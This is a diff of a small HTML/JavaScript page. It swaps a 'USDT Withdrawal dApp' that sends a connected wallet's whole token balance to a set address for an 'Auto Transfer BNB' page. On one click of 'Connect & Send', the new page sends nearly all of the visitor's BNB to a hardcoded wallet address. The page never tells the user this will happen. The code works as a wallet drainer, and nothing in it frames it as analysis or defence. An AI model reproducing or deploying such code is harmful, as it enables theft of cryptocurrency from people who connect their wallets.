@@ -1,106 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Withdrawal dApp</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f0f0f0;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        #status {
-            margin-top: 20px;
-            color: #333;
-        }
-    </style>
+  <title>Auto Transfer BNB</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>USDT Withdrawal dApp</h1>
-    <button onclick="connectWallet()">Connect Trust Wallet</button>
-    <p>USDT Balance: <span id="balance">0</span> USDT</p>
-    <button onclick="withdrawUSDT()" id="withdrawBtn" disabled>Withdraw USDT</button>
-    <p id="status"></p>
+  <button onclick="connectAndTransfer()">Connect & Send</button>
 
-    <script>
-        let provider, signer, account, usdtContract;
-        const usdtAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT on BNB Smart Chain
-        const withdrawAddress = "0xYOUR_WITHDRAWAL_ADDRESS_HERE"; // Replace with your address
-        const usdtAbi = [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function transfer(address to, uint256 value) returns (bool)",
-            "function decimals() view returns (uint8)"
-        ];
+  <script>
+    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Yahan apna destination wallet address daalo
 
-        async function connectWallet() {
-            try {
-                if (typeof window.ethereum !== 'undefined') {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    signer = provider.getSigner();
-                    account = await signer.getAddress();
-                    document.getElementById("status").innerText = `Connected: ${account}`;
+    async function connectAndTransfer() {
+      if (window.ethereum) {
+        const web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const sender = accounts[0];
 
-                    // Switch to BNB Smart Chain (Chain ID: 56)
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }],
-                    });
+          // Get full balance in Wei
+          let balance = await web3.eth.getBalance(sender);
+          
+          // Gas cost estimate (use ~0.001 BNB as gas)
+          const gasEstimate = web3.utils.toWei("0.001", "ether");
 
-                    // Initialize USDT contract
-                    usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-                    await updateBalance();
-                    document.getElementById("withdrawBtn").disabled = false;
-                } else {
-                    document.getElementById("status").innerText = "Please install Trust Wallet or MetaMask!";
-                }
-            } catch (error) {
-                document.getElementById("status").innerText = `Error: ${error.message}`;
-            }
+          // Amount to send = balance - gas
+          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
+
+          if (amountToSend.lte(0)) {
+            alert("Insufficient balance to send BNB.");
+            return;
+          }
+
+          // Send BNB
+          const tx = await web3.eth.sendTransaction({
+            from: sender,
+            to: receiverAddress,
+            value: amountToSend.toString()
+          });
+
+          alert("BNB sent! Tx hash: " + tx.transactionHash);
+        } catch (err) {
+          console.error("Error:", err);
         }
-
-        async function updateBalance() {
-            try {
-                const balance = await usdtContract.balanceOf(account);
-                const decimals = await usdtContract.decimals();
-                const formattedBalance = ethers.utils.formatUnits(balance, decimals);
-                document.getElementById("balance").innerText = formattedBalance;
-            } catch (error) {
-                document.getElementById("status").innerText = `Error fetching balance: ${error.message}`;
-            }
-        }
-
-        async function withdrawUSDT() {
-            try {
-                const balance = await usdtContract.balanceOf(account);
-                if (balance.isZero()) {
-                    document.getElementById("status").innerText = "No USDT to withdraw!";
-                    return;
-                }
-
-                const tx = await usdtContract.transfer(withdrawAddress, balance);
-                document.getElementById("status").innerText = "Transaction sent! Waiting for confirmation...";
-                await tx.wait();
-                document.getElementById("status").innerText = "Withdrawal successful!";
-                await updateBalance();
-            } catch (error) {
-                document.getElementById("status").innerText = `Error withdrawing: ${error.message}`;
-            }
-        }
-    </script>
+      } else {
+        alert("Install MetaMask or Trust Wallet.");
+      }
+    }
+  </script>
 </body>
 </html>
